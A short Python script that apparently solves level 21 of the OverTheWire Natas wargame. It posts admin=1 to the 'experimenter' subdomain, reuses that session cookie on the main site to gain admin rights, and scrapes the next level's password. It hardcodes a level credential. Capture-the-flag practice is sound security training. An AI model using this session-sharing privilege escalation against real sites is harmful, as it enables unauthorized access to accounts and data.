import requests
import re

username = "natas21"
password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"
url = "http://%s.natas.labs.overthewire.org"%username
exp = "http://natas21-experimenter.natas.labs.overthewire.org"

session = requests.Session()


response1 = session.post(exp,data={ "admin" : "1","submit" :"1" } ,auth=(username,password))
old_sess_id = response1.cookies['PHPSESSID']

response2 = session.get(url, cookies={"PHPSESSID" : old_sess_id } ,auth=(username,password)) 
content = response2.text

flag = re.findall("Username: natas22\nPassword: (.*)</pre>",content)[0]
print("[+] Gotcha ",flag)


